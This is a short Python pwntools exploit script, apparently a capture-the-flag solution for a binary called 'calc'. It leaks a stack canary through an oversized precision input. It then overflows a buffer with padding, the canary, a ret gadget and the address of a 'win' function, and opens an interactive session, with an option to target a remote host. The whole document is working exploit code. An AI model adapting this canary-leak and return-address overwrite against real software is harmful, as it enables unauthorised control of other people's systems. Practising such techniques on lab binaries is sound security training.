#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("calc")

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()

io.sendlineafter(b"Enter the first operand:", b"pi")
io.sendlineafter(b"like to use:", b"10050")
io.recvuntil("That is: ")
leak = io.recv() # recv can take 4096
leak = io.recv() # recv can take 4096
leak = io.recv(1868) # recv can take 4096
canary = io.recv(8)
#print(leak)
canary = u64(canary.ljust(8, b"\x00"))
log.info("Canary: %s" % hex(canary))

io.sendlineafter(b"Enter the operator:", b"+")
io.sendlineafter(b"Enter the second operand:", b"1")

rop = ROP(elf)

offset = 40
payload = b"A"*offset
payload += p64(canary)
payload += b"B"*8 # RBP
payload += p64(rop.find_gadget(['ret']).address)
payload += p64(elf.sym.win)
io.sendlineafter(b"need to here:", payload)

io.interactive()
